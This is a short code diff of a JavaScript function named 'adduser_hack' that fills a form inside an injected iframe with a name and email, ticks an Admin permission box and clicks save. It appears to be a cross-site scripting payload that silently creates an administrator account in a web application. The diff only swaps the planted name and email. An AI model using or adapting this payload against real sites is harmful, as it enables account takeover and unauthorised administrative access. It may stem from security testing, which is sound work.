@@ -12,8 +12,8 @@ jQuery("body").append(iframe);
 
 
 function adduser_hack(){
-jQuery(iframe).contents().find('#lastName').val("hacker");
-jQuery(iframe).contents().find('#j_username').val("ajaytestacc@gmail.com");
+jQuery(iframe).contents().find('#lastName').val("hacker1");
+jQuery(iframe).contents().find('#j_username').val("nandha@gmail.com");
 jQuery(iframe).contents().find("#perType_Admin").click();
 jQuery(iframe).contents().find("#savebtn").click();
 }
